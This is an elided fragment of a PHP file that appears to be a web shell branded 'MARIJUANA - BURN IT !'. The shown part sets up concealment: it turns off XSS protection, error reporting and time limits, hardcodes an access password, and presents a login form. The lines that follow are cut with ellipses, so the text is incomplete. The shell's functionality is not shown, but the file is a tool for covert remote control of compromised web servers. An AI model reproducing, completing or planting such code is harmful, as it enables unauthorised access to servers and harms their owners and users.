<?php header("X-XSS-Protection: 0");session_start();ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
$pass = "siapasuruhkacung";
...
if(!($_SESSION['forbidden'])) {
	...
	<head>
		...
		<title>MARIJUANA - BURN IT !</title>
		<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
	</head>
	  <body style="margin-top:20%;background-color:#189048;">
		<center>
			<form method="post">
				<input type="password" name="password" placeholder="MARIJUANA">
				<input type="submit" value="BURN IT !">
			</form>
		</center>
	  </body>
	</html>
...
<!DOCTYPE html>
	<html dir="auto" lang="en-US">
		...
		<body>
			<header>
				<div class="y x" style="margin-top: 50px;">
